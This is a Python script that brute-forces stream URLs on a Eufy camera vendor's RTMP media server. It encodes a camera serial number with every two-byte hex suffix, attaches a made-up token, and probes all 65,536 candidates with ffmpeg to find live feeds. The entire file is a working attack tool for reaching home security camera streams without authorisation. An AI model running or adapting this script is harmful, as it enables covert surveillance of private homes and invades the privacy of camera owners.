import base64
import time
import datetime
import subprocess
import asyncio
from aiortc.contrib.media import MediaPlayer

#### Blank To Start with
payload = ""
#### Beginning of RTMP String
pre = "rtmp://mediaserver-usa4.eufylife.com/hls"
#### Cameras Serial Number
sn = "T8410P412234253E"
#Arbitrary
mid = "_0_2_"

####Function to get UTC as String
def gettime():
    now = datetime.datetime.utcnow()
    t = int(time.mktime(now.timetuple()))
    #### token is just me typing randomly on my keyboard
    return "?time="+str(t)+"&token=asgertsrjyuiyy543rweg"

####Function to check RTMP stream using FFmpeg
async def check_rtmp_stream_ffmpeg(rtmp_url):
    cmd = ['ffmpeg', '-timeout', '5000000', '-i', rtmp_url, '-f', 'null', '-']
    proc = await asyncio.create_subprocess_exec(*cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    await proc.communicate()
    return proc.returncode == 0

####Function to check all RTMP streams using FFmpeg
async def check_all_rtmp_streams_ffmpeg(url):
    tasks = []
    for i in range(256):
        for j in range(256):
            #### Brute Force Part
            hexcode = hex(i)[2:].zfill(2) + hex(j)[2:].zfill(2)
            payload = sn + mid + hexcode
            bstring = payload.encode('utf-8')
            b64 = base64.b64encode(bstring)
            final = b64.decode('utf-8')
            rtmp_url = url + final + gettime()
            tasks.append(asyncio.create_task(check_rtmp_stream_ffmpeg(rtmp_url)))
    results = await asyncio.gather(*tasks)
    working_urls = []
    for i, result in enumerate(results):
        if result:
            hexcode = hex(i // 256)[2:].zfill(2) + hex(i % 256)[2:].zfill(2)
            payload = sn + mid + hexcode
            bstring = payload.encode('utf-8')
            b64 = base64.b64encode(bstring)
            final = b64.decode('utf-8')
            rtmp_url = url + final + gettime()
            working_urls.append(rtmp_url)
    return working_urls

async def main():
    working_urls = await check_all_rtmp_streams_ffmpeg(pre)
    print(f"Working URLs: {working_urls}")
    
if __name__ == "__main__":
    asyncio.run(main())
